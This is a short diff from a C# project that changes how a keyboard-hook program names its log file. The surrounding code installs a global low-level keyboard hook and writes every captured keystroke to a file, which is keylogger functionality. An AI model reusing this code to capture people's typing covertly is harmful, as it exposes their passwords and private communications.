@@ -49,15 +49,17 @@ namespace userControlProgram
         private static InputLanguageCollection _InstalledInputLanguages;
 
         private static string _currentInputLanguage;
+        public static string LogPath;
+        private static string _logName;
 
         public static void SetHook(string logPath)
         {
-            _logPath = logPath;
+            LogPath = logPath;
+            _logName = LogPath + "log";
             IntPtr hInstance = LoadLibrary("User32");
             hhook = SetWindowsHookEx(WH_KEYBOARD_LL, _proc, hInstance, 0);
         }
 
-        private static string _logPath = "log";
 
 
 
@@ -222,7 +224,7 @@ namespace userControlProgram
 
         public static void WriteLog (string key)
         {
-            StreamWriter logStream = new StreamWriter(_logPath, true, Encoding.Default);
+            StreamWriter logStream = new StreamWriter(_logName, true, Encoding.Default);
             logStream.Write(key);
             logStream.Close();
         }
